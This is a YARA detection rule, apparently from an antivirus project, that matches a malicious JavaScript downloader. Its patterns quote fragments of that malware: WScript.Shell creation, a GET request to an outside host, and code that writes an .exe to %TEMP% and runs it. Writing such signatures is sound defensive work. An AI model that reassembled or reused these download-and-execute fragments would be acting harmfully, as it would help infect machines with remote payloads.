rule sig_20160330_af43ca55b83341872964b558a2a92a23 {
  meta:
    description = "datamaliciousorder - file 20160330_af43ca55b83341872964b558a2a92a23.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a1ba0b2a56b4a347102faf1ee9c92f7be7fa644c5c2caf2a8e8485938961180e"

  strings:
    $s1  = "function I(ZY, P){PX = PX * 1; return ZY - P;};" fullword ascii
    $s2  = "var K0 = function K() {return WScript[L](\"WScript\"+\".Shell\");}(), BU = 11;" fullword ascii
    $s3  = "TL[C](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s4  = "if (TL[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function J(){return V + \"\";};" fullword ascii
    $s6  = "function N() {return K0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Nqahj0kAytZF1lkQ.ex\" + \"e\";};" fullword ascii
    $s7  = "function IA(X){K0[\"Run\"](X, PX, PX);};" fullword ascii
    $s8  = "function NN() {return ((QE == true) && (QE == D)) ? 1 : PX;};" fullword ascii
    $s9  = "function NP(){return L;};" fullword ascii
    $s10 = "function BZ(){return 22;};" fullword ascii
    $s11 = "}while (C0);" fullword ascii
    $s12 = "function HO(EI) {var DK = (1, 2, 3, 4, 5, EI); return DK;};" fullword ascii
    $s13 = "return I(LG, W);" fullword ascii
    $s14 = "var U1 = new this[\"Date\"]();" fullword ascii
    $s15 = "var Z = false;" fullword ascii
    $s16 = "var QE = false;" fullword ascii
    $s17 = "QE = true; " fullword ascii
    $s18 = "} catch(RI){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}